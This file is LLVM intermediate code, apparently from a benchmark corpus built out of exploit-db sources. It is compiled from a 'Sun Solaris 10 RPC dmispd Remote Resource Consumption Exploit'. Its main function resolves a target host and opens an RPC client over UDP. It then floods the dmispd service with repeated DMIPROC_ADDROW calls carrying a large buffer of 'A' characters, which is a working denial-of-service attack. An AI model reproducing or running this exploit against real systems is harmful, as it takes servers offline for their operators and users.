; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/solaris/dos/extr_9823.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/solaris/dos/extr_9823.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.timeval = type { i32, i32 }
%struct.hostent = type { i32 }
%struct.sockaddr_in = type { i64, i32, %struct.TYPE_7__ }
%struct.TYPE_7__ = type { i32 }
%struct.TYPE_8__ = type { i32 }

@SIZE = common dso_local global i32 0, align 4
@RPC_ANYSOCK = common dso_local global i32 0, align 4
@__const.main.tm = private unnamed_addr constant %struct.timeval { i32 10, i32 0 }, align 4
@.str = private unnamed_addr constant [64 x i8] c"\0ASun Solaris 10 RPC dmispd Remote Resource Consumption Exploit\0A\00", align 1
@.str.1 = private unnamed_addr constant [21 x i8] c"Usage: %s <target>\0A\0A\00", align 1
@.str.2 = private unnamed_addr constant [14 x i8] c"gethostbyname\00", align 1
@AF_INET = common dso_local global i32 0, align 4
@PROG_NUM = common dso_local global i32 0, align 4
@PROG_VER = common dso_local global i32 0, align 4
@.str.3 = private unnamed_addr constant [15 x i8] c"clntudp_create\00", align 1
@.str.4 = private unnamed_addr constant [48 x i8] c"\0AConsuming Resources @ %s [P:%d V:%d F:%d]...\0A\0A\00", align 1
@DMIPROC_ADDROW = common dso_local global i32 0, align 4
@LOOP = common dso_local global i32 0, align 4
@.str.5 = private unnamed_addr constant [9 x i8] c"--> #%d\0A\00", align 1
@xdr_wrapstring = common dso_local global i64 0, align 8
@RPC_SUCCESS = common dso_local global i32 0, align 4
@.str.6 = private unnamed_addr constant [4 x i8] c"rpc\00", align 1
@.str.7 = private unnamed_addr constant [48 x i8] c"\0AFinished. Now your sun server may recover :)\0A\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i8*, align 8
  %7 = alloca i64, align 8
  %8 = alloca i8*, align 8
  %9 = alloca i8*, align 8
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca %struct.hostent*, align 8
  %13 = alloca %struct.sockaddr_in, align 8
  %14 = alloca %struct.timeval, align 4
  %15 = alloca %struct.TYPE_8__*, align 8
  %16 = alloca i32, align 4
  %17 = alloca i32, align 4
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  %18 = load i32, i32* @SIZE, align 4
  %19 = zext i32 %18 to i64
  %20 = call i8* @llvm.stacksave()
  store i8* %20, i8** %6, align 8
  %21 = alloca i8, i64 %19, align 16
  store i64 %19, i64* %7, align 8
  %22 = load i8**, i8*** %5, align 8
  %23 = getelementptr inbounds i8*, i8** %22, i64 1
  %24 = load i8*, i8** %23, align 8
  store i8* %24, i8** %9, align 8
  %25 = load i32, i32* @RPC_ANYSOCK, align 4
  store i32 %25, i32* %11, align 4
  %26 = bitcast %struct.timeval* %14 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* align 4 %26, i8* align 4 bitcast (%struct.timeval* @__const.main.tm to i8*), i64 8, i1 false)
  %27 = load i32, i32* %4, align 4
  %28 = icmp slt i32 %27, 2
  br i1 %28, label %29, label %35

29:                                               ; preds = %2
  %30 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([64 x i8], [64 x i8]* @.str, i64 0, i64 0))
  %31 = load i8**, i8*** %5, align 8
  %32 = getelementptr inbounds i8*, i8** %31, i64 0
  %33 = load i8*, i8** %32, align 8
  %34 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.1, i64 0, i64 0), i8* %33)
  store i32 0, i32* %3, align 4
  store i32 1, i32* %17, align 4
  br label %110

35:                                               ; preds = %2
  %36 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([64 x i8], [64 x i8]* @.str, i64 0, i64 0))
  %37 = load i8*, i8** %9, align 8
  %38 = call %struct.hostent* @gethostbyname(i8* %37)
  store %struct.hostent* %38, %struct.hostent** %12, align 8
  %39 = icmp eq %struct.hostent* %38, null
  br i1 %39, label %40, label %43

40:                                               ; preds = %35
  %41 = call i32 @perror(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.2, i64 0, i64 0))
  %42 = call i32 @exit(i32 -1) #5
  unreachable

43:                                               ; preds = %35
  %44 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %13, i32 0, i32 2
  %45 = getelementptr inbounds %struct.TYPE_7__, %struct.TYPE_7__* %44, i32 0, i32 0
  %46 = load %struct.hostent*, %struct.hostent** %12, align 8
  %47 = getelementptr inbounds %struct.hostent, %struct.hostent* %46, i32 0, i32 0
  %48 = load i32, i32* %47, align 4
  %49 = call i32 @memcpy(i32* %45, i32 %48, i32 4)
  %50 = load i32, i32* @AF_INET, align 4
  %51 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %13, i32 0, i32 1
  store i32 %50, i32* %51, align 8
  %52 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %13, i32 0, i32 0
  store i64 0, i64* %52, align 8
  %53 = load i32, i32* @PROG_NUM, align 4
  %54 = load i32, i32* @PROG_VER, align 4
  %55 = bitcast %struct.timeval* %14 to i64*
  %56 = load i64, i64* %55, align 4
  %57 = call %struct.TYPE_8__* @clntudp_create(%struct.sockaddr_in* %13, i32 %53, i32 %54, i64 %56, i32* %11)
  store %struct.TYPE_8__* %57, %struct.TYPE_8__** %15, align 8
  %58 = icmp eq %struct.TYPE_8__* %57, null
  br i1 %58, label %59, label %62

59:                                               ; preds = %43
  %60 = call i32 @clnt_pcreateerror(i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.3, i64 0, i64 0))
  %61 = call i32 @exit(i32 -1) #5
  unreachable

62:                                               ; preds = %43
  %63 = call i32 (...) @authunix_create_default()
  %64 = load %struct.TYPE_8__*, %struct.TYPE_8__** %15, align 8
  %65 = getelementptr inbounds %struct.TYPE_8__, %struct.TYPE_8__* %64, i32 0, i32 0
  store i32 %63, i32* %65, align 4
  %66 = trunc i64 %19 to i32
  %67 = call i32 @memset(i8* %21, i8 signext 65, i32 %66)
  store i8* %21, i8** %8, align 8
  %68 = load i8*, i8** %9, align 8
  %69 = load i32, i32* @PROG_NUM, align 4
  %70 = load i32, i32* @PROG_VER, align 4
  %71 = load i32, i32* @DMIPROC_ADDROW, align 4
  %72 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([48 x i8], [48 x i8]* @.str.4, i64 0, i64 0), i8* %68, i32 %69, i32 %70, i32 %71)
  store i32 0, i32* %10, align 4
  br label %73

73:                                               ; preds = %99, %62
  %74 = load i32, i32* %10, align 4
  %75 = load i32, i32* @LOOP, align 4
  %76 = icmp slt i32 %74, %75
  br i1 %76, label %77, label %102

77:                                               ; preds = %73
  %78 = load i32, i32* %10, align 4
  %79 = add nsw i32 %78, 1
  %80 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.5, i64 0, i64 0), i32 %79)
  %81 = load %struct.TYPE_8__*, %struct.TYPE_8__** %15, align 8
  %82 = load i32, i32* @DMIPROC_ADDROW, align 4
  %83 = load i64, i64* @xdr_wrapstring, align 8
  %84 = trunc i64 %83 to i32
  %85 = bitcast i8** %8 to i8*
  %86 = load i64, i64* @xdr_wrapstring, align 8
  %87 = trunc i64 %86 to i32
  %88 = bitcast i8** %8 to i8*
  %89 = bitcast %struct.timeval* %14 to i64*
  %90 = load i64, i64* %89, align 4
  %91 = call i32 @clnt_call(%struct.TYPE_8__* %81, i32 %82, i32 %84, i8* %85, i32 %87, i8* %88, i64 %90)
  store i32 %91, i32* %16, align 4
  %92 = load i32, i32* %16, align 4
  %93 = load i32, i32* @RPC_SUCCESS, align 4
  %94 = icmp ne i32 %92, %93
  br i1 %94, label %95, label %98

95:                                               ; preds = %77
  %96 = load %struct.TYPE_8__*, %struct.TYPE_8__** %15, align 8
  %97 = call i32 @clnt_perror(%struct.TYPE_8__* %96, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.6, i64 0, i64 0))
  br label %98

98:                                               ; preds = %95, %77
  br label %99

99:                                               ; preds = %98
  %100 = load i32, i32* %10, align 4
  %101 = add nsw i32 %100, 1
  store i32 %101, i32* %10, align 4
  br label %73

102:                                              ; preds = %73
  %103 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([48 x i8], [48 x i8]* @.str.7, i64 0, i64 0))
  %104 = load %struct.TYPE_8__*, %struct.TYPE_8__** %15, align 8
  %105 = getelementptr inbounds %struct.TYPE_8__, %struct.TYPE_8__* %104, i32 0, i32 0
  %106 = load i32, i32* %105, align 4
  %107 = call i32 @auth_destroy(i32 %106)
  %108 = load %struct.TYPE_8__*, %struct.TYPE_8__** %15, align 8
  %109 = call i32 @clnt_destroy(%struct.TYPE_8__* %108)
  store i32 0, i32* %17, align 4
  br label %110

110:                                              ; preds = %102, %29
  %111 = load i8*, i8** %6, align 8
  call void @llvm.stackrestore(i8* %111)
  %112 = load i32, i32* %17, align 4
  switch i32 %112, label %115 [
    i32 0, label %113
    i32 1, label %113
  ]

113:                                              ; preds = %110, %110
  %114 = load i32, i32* %3, align 4
  ret i32 %114

115:                                              ; preds = %110
  unreachable
}

; Function Attrs: nounwind
declare i8* @llvm.stacksave() #1

; Function Attrs: argmemonly nounwind willreturn
declare void @llvm.memcpy.p0i8.p0i8.i64(i8* noalias nocapture writeonly, i8* noalias nocapture readonly, i64, i1 immarg) #2

declare dso_local i32 @printf(i8*, ...) #3

declare dso_local %struct.hostent* @gethostbyname(i8*) #3

declare dso_local i32 @perror(i8*) #3

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #4

declare dso_local i32 @memcpy(i32*, i32, i32) #3

declare dso_local %struct.TYPE_8__* @clntudp_create(%struct.sockaddr_in*, i32, i32, i64, i32*) #3

declare dso_local i32 @clnt_pcreateerror(i8*) #3

declare dso_local i32 @authunix_create_default(...) #3

declare dso_local i32 @memset(i8*, i8 signext, i32) #3

declare dso_local i32 @clnt_call(%struct.TYPE_8__*, i32, i32, i8*, i32, i8*, i64) #3

declare dso_local i32 @clnt_perror(%struct.TYPE_8__*, i8*) #3

declare dso_local i32 @auth_destroy(i32) #3

declare dso_local i32 @clnt_destroy(%struct.TYPE_8__*) #3

; Function Attrs: nounwind
declare void @llvm.stackrestore(i8*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { nounwind }
attributes #2 = { argmemonly nounwind willreturn }
attributes #3 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #4 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #5 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
